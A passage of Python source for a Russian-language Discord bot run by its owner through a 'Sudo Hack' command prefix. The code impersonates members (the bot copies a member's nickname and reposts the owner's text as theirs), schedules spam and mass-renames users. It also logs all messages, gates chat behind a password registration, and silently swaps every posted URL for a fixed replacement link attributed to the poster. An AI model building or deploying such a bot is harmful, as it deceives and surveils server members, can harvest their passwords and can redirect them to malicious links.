            await member.add_roles(role)
            await output_target.send(f"Роль '{role.name}' выдана пользователю '{member.name}'.")
        except Exception as e:
            await output_target.send(f"Ошибка при выдаче роли: {e}")
            
    # Команда удаления роли
    elif cmd == "remove_role" and len(args) >= 2:
        try:
            member_id = int(args[0])
            role_id = int(args[1])
            member = await guild.fetch_member(member_id)
            role = guild.get_role(role_id)
            if not role:
                await output_target.send("Ошибка: Роль не найдена на сервере.")
                return
            await member.remove_roles(role)
            await output_target.send(f"Роль '{role.name}' забрана у пользователя '{member.name}'.")
        except Exception as e:
            await output_target.send(f"Ошибка при удалении роли: {e}")

    # Команда для включения маскировки
    elif cmd == "mimic" and len(args) == 1:
        try:
            target_id = int(args[0])
            target_member = await guild.fetch_member(target_id)
            if not target_member:
                await output_target.send("Ошибка: Неверный ID. Пользователь не найден на сервере.")
                return
            target_user_id = target_id
            masking_enabled = True
            await output_target.send(f"Маскировка включена. Сообщения будут отправляться от имени {target_member.display_name}.")
        except ValueError:
            await output_target.send("Ошибка: ID должен быть числом.")
        except Exception as e:
            await output_target.send(f"Произошла ошибка: {e}")

    # Команда для отключения маскировки
    elif cmd == "mimic_off":
        masking_enabled = False
        target_user_id = None
        if original_bot_nick:
            try:
                await guild.me.edit(nick=original_bot_nick)
                await output_target.send(f"Ник бота возвращён к '{original_bot_nick}'.")
            except discord.Forbidden:
                await output_target.send("Ошибка: Недостаточно прав для возврата оригинального ника.")
        await output_target.send("Маскировка выключена.")

    # Массовая смена ников
    elif cmd == "change_all_nicks" and len(args) >= 1:
        new_nick = " ".join(args)
        await output_target.send(f"Начинаю массовую смену ников на '{new_nick}'...")
        members_changed = 0
        for member in guild.members:
            if member.bot: continue
            try:
                await member.edit(nick=new_nick)
                members_changed += 1
                await asyncio.sleep(0.5)
            except discord.Forbidden:
                print(f"Недостаточно прав для изменения ника у {member.name}.")
        await output_target.send(f"Массовая смена ников завершена. Изменено {members_changed} ников.")
    
    # Перемещение в голосовом чате
    elif cmd == "move_to" and len(args) == 2:
        try:
            member_id = int(args[0])
            channel_input = args[1]
            channel_id = get_channel_id_by_name(guild, channel_input)
            member = await guild.fetch_member(member_id)
            channel = guild.get_channel(channel_id)
            if not member or not channel or not isinstance(channel, discord.VoiceChannel):
                await output_target.send("Ошибка: Пользователь или голосовой канал не найдены.")
                return
            await member.move_to(channel)
            await output_target.send(f"Пользователь {member.name} перемещен в канал {channel.name}.")
        except Exception as e:
            await output_target.send(f"Ошибка при перемещении: {e}")
    
    # Массовое перемещение
    elif cmd == "move_all_to" and len(args) == 1:
        try:
            channel_input = args[0]
            channel_id = get_channel_id_by_name(guild, channel_input)
            channel = guild.get_channel(channel_id)
            if not channel or not isinstance(channel, discord.VoiceChannel):
                await output_target.send("Ошибка: Голосовой канал не найден.")
                return
            moved_count = 0
            for member in guild.members:
                if member.voice:
                    await member.move_to(channel)
                    moved_count += 1
                    await asyncio.sleep(0.5)
            await output_target.send(f"Перемещено {moved_count} пользователей в канал {channel.name}.")
        except Exception as e:
            await output_target.send(f"Ошибка при массовом перемещении: {e}")

    # "Заморозка" канала
    elif cmd == "lockdown" and len(args) == 1:
        try:
            channel_input = args[0]
            channel_id = get_channel_id_by_name(guild, channel_input)
            channel = bot.get_channel(channel_id)
            if not channel:
                await output_target.send(f"Ошибка: Канал '{channel_input}' не найден.")
                return
            everyone_role = guild.default_role
            await channel.set_permissions(everyone_role, send_messages=False)
            await output_target.send(f"Канал {channel.name} 'заморожен'.")
        except Exception as e:
            await output_target.send(f"Ошибка при 'заморозке': {e}")
    
    # Снятие "заморозки"
    elif cmd == "lockdown_off" and len(args) == 1:
        try:
            channel_input = args[0]
            channel_id = get_channel_id_by_name(guild, channel_input)
            channel = bot.get_channel(channel_id)
            if not channel:
                await output_target.send(f"Ошибка: Канал '{channel_input}' не найден.")
                return
            everyone_role = guild.default_role
            await channel.set_permissions(everyone_role, send_messages=True)
            await output_target.send(f"Канал {channel.name} разморожен.")
        except Exception as e:
            await output_target.send(f"Ошибка при снятии 'заморозки': {e}")
    
    # Изменение темы канала
    elif cmd == "change_topic" and len(args) >= 2:
        try:
            channel_input = args[0]
            channel_id = get_channel_id_by_name(guild, channel_input)
            new_topic = " ".join(args[1:])
            channel = bot.get_channel(channel_id)
            if channel:
                await channel.edit(topic=new_topic)
                await output_target.send(f"Тема канала {channel.name} изменена на: '{new_topic}'")
            else:
                await output_target.send(f"Ошибка: Канал '{channel_input}' не найден.")
        except Exception as e:
            await output_target.send(f"Ошибка при изменении темы: {e}")

    # Запланированный спам
    elif cmd == "schedule_spam" and len(args) >= 4:
        try:
            channel_input = args[0]
            channel_id = get_channel_id_by_name(guild, channel_input)
            count = int(args[1])
            message_text = " ".join(args[2:-1])
            delay_seconds = int(args[-1])
            
            async def scheduled_task():
                await asyncio.sleep(delay_seconds)
                channel = bot.get_channel(channel_id)
                if channel:
                    await output_target.send(f"Выполняю запланированный спам в канал {channel.name}...")
                    for _ in range(count):
                        await channel.send(message_text)
                        await asyncio.sleep(0.5)
                    await output_target.send("Запланированный спам завершен.")
                else:
                    await output_target.send("Ошибка: Канал для запланированного спама не найден.")
            
            bot.loop.create_task(scheduled_task())
            await output_target.send(f"Запланирована задача: спам в канал {channel_input} через {delay_seconds} секунд.")
        except Exception as e:
            await output_target.send(f"Ошибка при планировании спама: {e}")

    # --- НОВЫЙ КОД: ОБРАБОТКА КОМАНДЫ show_logs в ЛС ---
    elif cmd == "show_logs":
        log_files = sorted([f for f in os.listdir('.') if f.startswith('discord_log_') and f.endswith('.txt')])
        
        # Автоматическая очистка: удаляем самый старый файл, если их больше 9
        if len(log_files) > 9:
            oldest_file = log_files.pop(0)
            try:
                os.remove(oldest_file)
                await output_target.send(f"Старый лог-файл '{oldest_file}' был автоматически удален.")
            except OSError as e:
                await output_target.send(f"Ошибка при удалении файла {oldest_file}: {e}")

        if not args:
            if not log_files:
                await output_target.send("Нет доступных лог-файлов.")
                return
            
            logs_list = "\n".join([f"{i}: Лог за {f.replace('discord_log_', '').replace('.txt', '')}" for i, f in enumerate(log_files, 1)])
            await output_target.send(f"**--- ДОСТУПНЫЕ ЛОГИ ---**\n{logs_list}\n**------------------------**\nЧтобы посмотреть лог, введите `Sudo Hack show_logs <номер>`")

        elif len(args) == 1:
            try:
                log_number = int(args[0])
                if 1 <= log_number <= len(log_files):
                    selected_file = log_files[log_number - 1]
                    with open(selected_file, 'r', encoding='utf-8') as f:
                        logs = f.read()
                        # Отправляем лог частями, если он слишком длинный
                        if len(logs) > 2000:
                            for i in range(0, len(logs), 1900):
                                await output_target.send(f"```{logs[i:i+1900]}```")
                            await output_target.send(f"--- Конец лога {selected_file} ---")
                        else:
                            await output_target.send(f"**--- НАЧАЛО ЛОГА {selected_file} ---**\n```{logs}```\n**--- КОНЕЦ ЛОГА {selected_file} ---**")
                else:
                    await output_target.send("Ошибка: Неверный номер лог-файла. Введите `Sudo Hack show_logs` без аргументов, чтобы увидеть список.")
            except ValueError:
                await output_target.send("Ошибка: Аргумент должен быть числом.")
            except FileNotFoundError:
                await output_target.send("Ошибка: Выбранный лог-файл не найден.")
            except Exception as e:
                await output_target.send(f"Ошибка при чтении логов: {e}")

    # --- КОМАНДА: АВТОВЫДАЧА РОЛИ ---
    elif cmd == "auto_role" and len(args) >= 2:
        role_id_input = args[0]
        announce_input = args[1].lower()
        
        try:
            global auto_role_enabled, auto_role_id, announce_inviter
            auto_role_id = int(role_id_input)
            announce_inviter = announce_input in ['t', 'true', 'да', '1']

            if announce_input in ['f', 'false', 'нет', '0', 't', 'true', 'да', '1']:
                auto_role_enabled = True
            else:
                await output_target.send("Ошибка: Неверное значение для второго аргумента (должно быть T/F).")
                return
            
            role = guild.get_role(auto_role_id)
            if role:
                await output_target.send(f"Автовыдача роли ВКЛЮЧЕНА. Роль: '{role.name}'. Оповещать об инвайте: {announce_inviter}.")
            else:
                auto_role_enabled = False
                await output_target.send("Ошибка: Роль с таким ID не найдена. Автовыдача отключена.")
        except ValueError:
            await output_target.send("Ошибка: ID роли должен быть числом.")
        except Exception as e:
            await output_target.send(f"Ошибка при настройке автовыдачи роли: {e}")
            
    # --- НОВЫЕ КОМАНДЫ ДЛЯ ЭКСТРЕННОЙ РЕГИСТРАЦИИ ---
    elif cmd == "extreg":
        emergency_registration_mode = True
        await output_target.send("Экстренная регистрация включена. Все незарегистрированные сообщения будут удаляться.")
    
    elif cmd == "extreg_off":
        emergency_registration_mode = False
        await output_target.send("Экстренная регистрация отключена.")

    # Команда для получения помощи
    elif cmd == "help":
        help_text = (
            "**Список доступных команд (используйте ID или #имя_канала):**\n"
            "Чтобы получить список ID, введите `<команда> ?` или `<команда> empty` или `<команда> пусто>`\n\n"
            f"`{COMMAND_PREFIX} help` (выводит этот список)\n"
            f"`/reg`, `/register` **<ник> <пароль>** (регистрация в системе)\n"
            f"`/login`, `/l` **<ник> <пароль>** (восстановление аккаунта)\n"
            f"`{COMMAND_PREFIX} whois <ID> <пароль>` (отправляет отчёт в ЛС)\n"
            f"`{COMMAND_PREFIX} change_nick <ID> <новый ник>`\n"
            f"`{COMMAND_PREFIX} change_all_nicks <новый ник>`\n"
            f"`{COMMAND_PREFIX} send_message <#канал или ID> <сообщение>`\n"
            f"`{COMMAND_PREFIX} add_role <ID пользователя> <ID роли>`\n"
            f"`{COMMAND_PREFIX} remove_role <ID пользователя> <ID роли>`\n"
            f"`{COMMAND_PREFIX} spam <#канал или ID> <кол-во> <сообщение>`\n"
            f"`{COMMAND_PREFIX} clear <#канал или ID> <кол-во> (очистка чата)`\n"
            f"`{COMMAND_PREFIX} clear_user <#канал или ID> <ID пользователя> <кол-во> (очистка сообщений конкретного пользователя)`\n"
            f"`{COMMAND_PREFIX} mimic <ID пользователя>` (включает маскировку)\n"
            f"`{COMMAND_PREFIX} mimic_off` (отключает маскировку)\n"
            f"`{COMMAND_PREFIX} move_to <ID пользователя> <#канал или ID>`\n"
            f"`{COMMAND_PREFIX} move_all_to <#канал или ID>`\n"
            f"`{COMMAND_PREFIX} lockdown <#канал или ID>`\n"
            f"`{COMMAND_PREFIX} lockdown_off <#канал или ID>`\n"
            f"`{COMMAND_PREFIX} change_topic <#канал или ID> <новая_тема>`\n"
            f"`{COMMAND_PREFIX} schedule_spam <#канал или ID> <кол-во> <сообщение> <секунды задержки>`\n"
            f"`{COMMAND_PREFIX} auto_role <ID роли> <T/F>`\n"
            f"`{COMMAND_PREFIX} extreg` (включить режим экстренной регистрации)\n"
            f"`{COMMAND_PREFIX} extreg_off` (отключить режим экстренной регистрации)\n"
            f"`{COMMAND_PREFIX} Reset_pass <новый_пароль> <подтверждение>` (работает ТОЛЬКО в ЛС с ботом)"
        )
        await output_target.send(help_text)
    
# --- ОБРАБОТЧИК СОБЫТИЙ DISCORD ---
@bot.event
async def on_message(message):
    global WHOIS_PASSWORD, emergency_registration_mode
    
    # Проверяем, является ли сообщение личным
    is_dm = message.guild is None

    # Обработка команд в ЛС
    if is_dm:
        # Команды регистрации и логина
        if message.content.lower().startswith(SLASH_COMMANDS):
            await process_registration_command(message)
            return

        # Команда сброса пароля
        if message.author.id == OWNER_ID and message.content.lower().startswith(f"{COMMAND_PREFIX.lower()} reset_pass"):
            command_content = message.content[len(COMMAND_PREFIX) + 1:].strip()
            command_parts = command_content.split()
            
            if len(command_parts) != 3:
                await message.author.send("Ошибка: Неверное количество аргументов. Используй `Sudo Hack Reset_pass <новый_пароль> <подтверждение>`")
                return
            
            new_pass, confirm_pass = command_parts[1:]
            
            if new_pass != confirm_pass:
                await message.author.send("Ошибка: Пароли не совпадают.")
                return
                
            WHOIS_PASSWORD = new_pass
            save_config()
            await message.author.send(f"Пароль для команды `whois` успешно сброшен на: `{new_pass}`. Не забудь удалить это сообщение из истории.")
        
        # Переносим обработку show_logs из process_private_command, чтобы она работала только в ЛС
        if message.author.id == OWNER_ID and message.content.lower().startswith(f"{COMMAND_PREFIX.lower()} show_logs"):
            await process_private_command(message) # Используем ту же функцию
            return

        # Если команда не из списка - уведомляем пользователя
        if not message.content.lower().startswith(f"{COMMAND_PREFIX.lower()}") and not message.content.lower().startswith(SLASH_COMMANDS):
            await message.author.send("Эта команда недоступна в ЛС или не существует. Для управления используй команды с префиксом `Sudo Hack`.")
        
        return
        
    # Обработка сообщений в чате
    if message.author.bot:
        return
        
    global masking_enabled, target_user_id, original_bot_nick
    
    # Если кто-то пытается использовать команды регистрации в чате
    if message.content.lower().startswith(SLASH_COMMANDS):
        try:
            await message.delete()
            await message.author.send(
                "Эта команда работает только в личных сообщениях с ботом. "
                "Напиши мне в ЛС, чтобы зарегистрироваться или авторизоваться."
            )
        except discord.Forbidden:
            print("Не удалось удалить сообщение с командой регистрации. Недостаточно прав.")
        return # Прекращаем выполнение, так как команда обработана

    # --- НОВЫЙ КОД: ПРОВЕРКА АВТОРИЗАЦИИ ПО ВРЕМЕНИ И ЕЁ СБРОС ---
    user_id_str = str(message.author.id)
    if user_id_str in registered_users:
        last_login_str = registered_users[user_id_str].get('last_login')
        if last_login_str:
            last_login_time = datetime.datetime.fromisoformat(last_login_str)
            time_difference = datetime.datetime.now() - last_login_time
            if time_difference > datetime.timedelta(days=4):
                # Сбрасываем авторизацию
                del registered_users[user_id_str]
                save_users()
                try:
                    await message.author.send(
                        "Срок твоей авторизации истёк. "
                        "Пожалуйста, пройди повторную авторизацию, чтобы продолжить общение."
                    )
                except discord.Forbidden:
                    print(f"Не удалось отправить ЛС пользователю {message.author.name} ({message.author.id}) - у него закрыта личка.")
    
    # --- НОВЫЙ КОД: ПРОВЕРКА НА РЕГИСТРАЦИЮ В ЭКСТРЕННОМ РЕЖИМЕ ---
    if emergency_registration_mode:
        if str(message.author.id) not in registered_users:
            try:
                await message.delete()
                # НЕ отправляем сообщение в ЛС в этом режиме, чтобы избежать спама
                return
            except discord.Forbidden:
                print(f"Не удалось удалить сообщение пользователя {message.author.name} ({message.author.id}).")
            except Exception as e:
                print(f"Ошибка при удалении сообщения в экстренном режиме: {e}")
    
    # Если не экстренный режим, но пользователь не зарегистрирован - удаляем
    if not emergency_registration_mode and str(message.author.id) not in registered_users and message.author.id not in [OWNER_ID, FRIEND_ID]:
        if not message.content.lower().startswith(f"{COMMAND_PREFIX.lower()}"):
            try:
                await message.delete()
                registration_message = (
                    f"Привет, {message.author.name}!\n\n"
                    f"На этом сервере действует обязательная регистрация. Твоё сообщение было удалено.\n"
                    f"Пожалуйста, зарегистрируйся, используя команду:\n"
                    f"**`/register <твой_ник_на_сервере> <твой_пароль>`**\n\n"
                    f"Или войди в свой аккаунт, если он у тебя есть:\n"
                    f"**`/login <твой_ник_на_сервере> <твой_пароль>`**"
                )
                await message.author.send(registration_message)
            except discord.Forbidden:
                print(f"Не удалось отправить ЛС пользователю {message.author.name} ({message.author.id}) - у него закрыта личка.")
            except Exception as e:
                print(f"Ошибка при удалении сообщения или отправке ЛС: {e}")
            return # Прекращаем выполнение, чтобы не обрабатывать другие команды

    # Увеличиваем счётчик сообщений для зарегистрированных пользователей
    if str(message.author.id) in registered_users:
        registered_users[str(message.author.id)]['message_count'] += 1
        save_users()

    log_to_file(message)

    # --- НОВАЯ ФУНКЦИЯ: МОНИТОРИНГ БЕЗОПАСНОСТИ ---
    if message.author.id not in [OWNER_ID, FRIEND_ID]:
        for sensitive_word in sensitive_data:
            if sensitive_word in message.content.lower():
                owner = await bot.fetch_user(OWNER_ID)
                report_message = (
                    f"**Обнаружена попытка слива данных!**\n"
                    f"Пользователь: `{message.author.name}`\n"
                    f"В канале: `#{message.channel.name}`\n"
                    f"Сообщение: `{message.content}`\n\n"
                    f"Чтобы удалить это сообщение, отправь:\n`Sudo Hack clear_message {message.channel.id} {message.id}`"
                )
                await owner.send(report_message)
                break
    
    # --- НОВЫЙ КОД: ОБРАБОТКА ПРИВАТНЫХ КОМАНД ---
    if (message.author.id == OWNER_ID or message.author.id == FRIEND_ID) and message.content.lower().startswith(f"{COMMAND_PREFIX.lower()} "):
        try:
            await message.delete()
        except discord.Forbidden:
            print(f"Ошибка: Недостаточно прав для удаления сообщения в канале {message.channel.name}.")
        await process_private_command(message)
        return

    if message.author.id == OWNER_ID and masking_enabled:
        guild = message.guild
        try:
            target_member = await guild.fetch_member(target_user_id)
            if not target_member:
                print(f"Маскировка: Пользователь с ID {target_user_id} не найден. Отключаю маскировку.")
                masking_enabled = False
                return

            if original_bot_nick is None:
                original_bot_nick = guild.me.display_name

            await guild.me.edit(nick=target_member.display_name)
            await message.delete()
            content_to_send = message.content
            
            await message.channel.send(content_to_send)
            
        except discord.Forbidden:
            print("Маскировка: Недостаточно прав для изменения ника или удаления сообщения.")
        except Exception as e:
            print(f"Произошла ошибка в 'Маскировке': {e}")
            
    if re.search(URL_REGEX, message.content) and not message.author.bot:
        try:
            await message.delete()
            new_content = re.sub(URL_REGEX, REPLACEMENT_LINK, message.content)
            await message.channel.send(f"{message.author.mention}: {new_content}")
            print(f"Ссылка в сообщении от {message.author.name} была заменена.")
        except discord.Forbidden:
            print(f"Ошибка: Недостаточно прав для удаления сообщения в канале {message.channel.name}. Замена не сработала.")
        except Exception as e:
            print(f"Произошла ошибка при замене ссылки: {e}")

# --- ФУНКЦИЯ: АВТОВЫДАЧА РОЛИ ПРИ ВХОДЕ ---
@bot.event
async def on_member_join(member):
    global auto_role_enabled, auto_role_id, announce_inviter
    
    if member.guild.id != SERVER_ID:
        return
    
    if auto_role_enabled and auto_role_id:
        role_to_add = member.guild.get_role(auto_role_id)
        if role_to_add:
            try:
                await member.add_roles(role_to_add)
                print(f"Роль '{role_to_add.name}' успешно выдана новому участнику {member.name}.")
            except discord.Forbidden:
                print(f"Ошибка: Недостаточно прав для выдачи роли '{role_to_add.name}' новому участнику.")
        else:
            print("Ошибка: Роль для автовыдачи не найдена. Автовыдача будет отключена.")
            auto_role_enabled = False
            
    if announce_inviter:
        try:
            invites = await member.guild.invites()
            inviter = None
            for invite in invites:
                if invite.uses > 0:
                    inviter = invite.inviter
                    # --- НОВЫЙ КОД: СОХРАНЯЕМ ПРИГЛАШЕНИЕ ПРИ РЕГИСТРАЦИИ ---
                    if str(member.id) in registered_users:
                         registered_users[str(member.id)]['inviter_id'] = inviter.id
                         save_users()
                    # --------------------------------------------------------
                    break
            
            if inviter:
                channel_to_announce = bot.get_channel(ADMIN_CHANNEL_ID) 
                if channel_to_announce:
                    await channel_to_announce.send(f"Новый участник {member.name} ({member.discriminator}) зашел на сервер. Его пригласил {inviter.name} ({inviter.discriminator}).")
                else:
                    print("Ошибка: Канал для оповещения не найден. Проверь ID канала.")
        except discord.Forbidden:
            print("Ошибка: Недостаточно прав для просмотра приглашений на сервере.")
        except Exception as e:
            print(f"Произошла ошибка при поиске пригласителя: {e}")

# --- НОВОЕ СОБЫТИЕ: ОБРАБОТКА ИЗМЕНЕНИЙ В ГОЛОСОВОМ КАНАЛЕ ---
@bot.event
async def on_voice_state_update(member, before, after):
    user_id_str = str(member.id)
    if user_id_str not in registered_users:
        return

    # Если пользователь зашел в голосовой канал
    if before.channel is None and after.channel is not None:
        voice_activity[user_id_str] = datetime.datetime.now()
        print(f"{member.display_name} вошел в голосовой канал {after.channel.name}. Начало отсчета.")
    
    # Если пользователь вышел из голосового канала
    elif before.channel is not None and after.channel is None:
        if user_id_str in voice_activity:
            start_time = voice_activity.pop(user_id_str)
            end_time = datetime.datetime.now()
            duration_seconds = (end_time - start_time).total_seconds()
            
            registered_users[user_id_str]['total_voice_time'] = registered_users[user_id_str].get('total_voice_time', 0) + duration_seconds
            save_users()
            print(f"{member.display_name} вышел из голосового канала. Время в войсе: {format_voice_time(duration_seconds)}.")
    
    # Если пользователь перешел между каналами
    elif before.channel is not None and after.channel is not None and before.channel != after.channel:
        if user_id_str in voice_activity:
            start_time = voice_activity.pop(user_id_str)
            end_time = datetime.datetime.now()
            duration_seconds = (end_time - start_time).total_seconds()
            
            registered_users[user_id_str]['total_voice_time'] = registered_users[user_id_str].get('total_voice_time', 0) + duration_seconds
            voice_activity[user_id_str] = datetime.datetime.now() # Сразу начинаем новый отсчет
            save_users()
            print(f"{member.display_name} перешел из {before.channel.name} в {after.channel.name}. Время в старом войсе: {format_voice_time(duration_seconds)}.")

@bot.event
async def on_ready():
    print(f'Бот готов и вошел как {bot.user}')
    #load_users() # Загружаем данные пользователей при запуске
    load_config() # Загружаем конфигурацию
    print('Управление: теперь все команды доступны и в консоли, и в чате.')
    print(f'Консоль: используй "help" для списка команд, включая "mimic <ID>" и "exit".')
    print(f'Чат: используйте префикс "{COMMAND_PREFIX} <команда>".')
    bot.loop.create_task(console_input_handler())

bot.run(BOT_TOKEN)